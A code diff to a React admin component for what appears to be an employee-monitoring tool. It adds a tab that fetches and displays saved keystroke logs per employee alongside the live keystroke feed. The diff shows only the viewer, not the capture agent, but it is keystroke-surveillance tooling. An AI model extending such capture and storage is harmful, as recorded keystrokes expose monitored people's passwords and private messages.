@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { Keyboard, Eye, EyeOff, Trash2, Download, Circle } from 'lucide-react';
+import { Keyboard, Eye, EyeOff, Trash2, Download, Circle, History, RefreshCw } from 'lucide-react';
 import useStore from '../store';
 import { toast } from 'react-hot-toast';
 
@@ -9,9 +9,56 @@ const Keylogger = ({ socket }) => {
     const [selectedEmployee, setSelectedEmployee] = useState('all');
     const [liveLog, setLiveLog] = useState({}); // { socketId: [{ text, timestamp, name }] }
     const [showLive, setShowLive] = useState(true);
+    const [historyLogs, setHistoryLogs] = useState([]);
+    const [viewMode, setViewMode] = useState('live'); // 'live' or 'history'
+    const [loadingHistory, setLoadingHistory] = useState(false);
     const logEndRef = useRef(null);
 
     const onlineEmployees = employees.filter(e => e.status === 'online');
+
+    const fetchSettings = async () => {
+        try {
+            const BACKEND_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+              ? 'http://localhost:5000'
+              : 'https://ayush-eye-1.onrender.com';
+            const token = localStorage.getItem('token');
+            const response = await fetch(`${BACKEND_URL}/api/admin/settings`, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            if (response.ok) {
+                const data = await response.json();
+                setKeylogEnabled(data.keylogEnabled === true);
+            }
+        } catch (err) {
+            console.error('Failed to fetch settings:', err);
+        }
+    };
+
+    const fetchHistory = async () => {
+        setLoadingHistory(true);
+        try {
+            const BACKEND_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+              ? 'http://localhost:5000'
+              : 'https://ayush-eye-1.onrender.com';
+            const token = localStorage.getItem('token');
+            const response = await fetch(`${BACKEND_URL}/api/admin/keylogs`, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            if (response.ok) {
+                const data = await response.json();
+                setHistoryLogs(data);
+            }
+        } catch (err) {
+            console.error('Failed to fetch keylogs:', err);
+        } finally {
+            setLoadingHistory(false);
+        }
+    };
+
+    useEffect(() => {
+        fetchSettings();
+        fetchHistory();
+    }, []);
 
     useEffect(() => {
         if (!socket) return;
@@ -27,6 +74,8 @@ const Keylogger = ({ socket }) => {
             if (logEndRef.current) {
                 logEndRef.current.scrollIntoView({ behavior: 'smooth' });
             }
+            // Auto refresh history in background
+            fetchHistory();
         };
 
         socket.on('keylog_live', handleKeylogLive);
@@ -71,6 +120,13 @@ const Keylogger = ({ socket }) => {
     const displayLog = selectedEmployee === 'all'
         ? Object.entries(liveLog)
         : Object.entries(liveLog).filter(([id]) => id === selectedEmployee);
+
+    const filteredHistory = selectedEmployee === 'all'
+        ? historyLogs
+        : historyLogs.filter(log => {
+            const emp = employees.find(e => e.socketId === selectedEmployee);
+            return emp ? log.employeeId === emp.id : log.employeeId === selectedEmployee;
+        });
 
     return (
         <div className="space-y-6">
@@ -137,8 +193,37 @@ const Keylogger = ({ socket }) => {
                 )}
             </div>
 
+            {/* Tabs for Feed Selection */}
+            <div className="flex border-b border-slate-700/50">
+                <button
+                    onClick={() => setViewMode('live')}
+                    className={`px-6 py-3 text-sm font-semibold flex items-center gap-2 border-b-2 transition-all ${
+                        viewMode === 'live'
+                            ? 'border-blue-500 text-blue-400'
+                            : 'border-transparent text-slate-400 hover:text-slate-200'
+                    }`}
+                >
+                    <Circle size={8} className={keylogEnabled ? 'fill-red-500 text-red-500 animate-pulse' : 'fill-slate-500 text-slate-500'} />
+                    Live Keystroke Feed
+                </button>
+                <button
+                    onClick={() => {
+                        setViewMode('history');
+                        fetchHistory();
+                    }}
+                    className={`px-6 py-3 text-sm font-semibold flex items-center gap-2 border-b-2 transition-all ${
+                        viewMode === 'history'
+                            ? 'border-blue-500 text-blue-400'
+                            : 'border-transparent text-slate-400 hover:text-slate-200'
+                    }`}
+                >
+                    <History size={14} />
+                    Saved History Log
+                </button>
+            </div>
+
             {/* Live Keylog Display */}
-            {showLive && (
+            {viewMode === 'live' && showLive && (
                 <div className="bg-[#0f172a] rounded-2xl border border-slate-700/50 overflow-hidden">
                     <div className="px-5 py-3 bg-slate-800/50 border-b border-slate-700/50 flex items-center justify-between">
                         <span className="text-sm font-semibold text-slate-300">Live Keystroke Feed</span>
@@ -168,9 +253,52 @@ const Keylogger = ({ socket }) => {
                                         ))}
                                     </div>
                                 </div>
-                            ))
+                             ))
                         )}
                         <div ref={logEndRef} />
+                    </div>
+                </div>
+            )}
+
+            {/* Saved History Log Display */}
+            {viewMode === 'history' && (
+                <div className="bg-[#0f172a] rounded-2xl border border-slate-700/50 overflow-hidden">
+                    <div className="px-5 py-3 bg-slate-800/50 border-b border-slate-700/50 flex items-center justify-between">
+                        <span className="text-sm font-semibold text-slate-300">Saved History Log</span>
+                        <button 
+                            onClick={fetchHistory}
+                            disabled={loadingHistory}
+                            className="p-1.5 hover:bg-slate-700 rounded-lg text-slate-400 hover:text-slate-200 transition-all flex items-center gap-1.5 text-xs"
+                        >
+                            <RefreshCw size={12} className={loadingHistory ? 'animate-spin' : ''} />
+                            Refresh
+                        </button>
+                    </div>
+                    <div className="p-5 space-y-4 max-h-[500px] overflow-y-auto font-mono">
+                        {loadingHistory ? (
+                            <div className="text-center py-12 text-slate-500">
+                                <RefreshCw size={30} className="mx-auto mb-3 animate-spin opacity-50" />
+                                <p>Loading saved keylogs...</p>
+                            </div>
+                        ) : filteredHistory.length === 0 ? (
+                            <div className="text-center py-12 text-slate-600">
+                                <History size={40} className="mx-auto mb-3 opacity-30" />
+                                <p>No saved keylogs found in history.</p>
+                                <p className="text-xs mt-1">Keystrokes are saved to history when a batch is received.</p>
+                            </div>
+                        ) : (
+                            <div className="space-y-4">
+                                {filteredHistory.map((logItem) => (
+                                    <div key={logItem._id} className="p-4 bg-[#1e293b]/30 border border-slate-800 rounded-xl space-y-2">
+                                        <div className="flex justify-between items-center text-xs border-b border-slate-800/80 pb-1.5">
+                                            <span className="font-bold text-blue-400">👤 {logItem.employeeName} ({logItem.pcName})</span>
+                                            <span className="text-slate-500">{new Date(logItem.timestamp).toLocaleString()}</span>
+                                        </div>
+                                        <p className="text-xs text-emerald-300 break-all whitespace-pre-wrap">{logItem.text}</p>
+                                    </div>
+                                ))}
+                            </div>
+                        )}
                     </div>
                 </div>
             )}
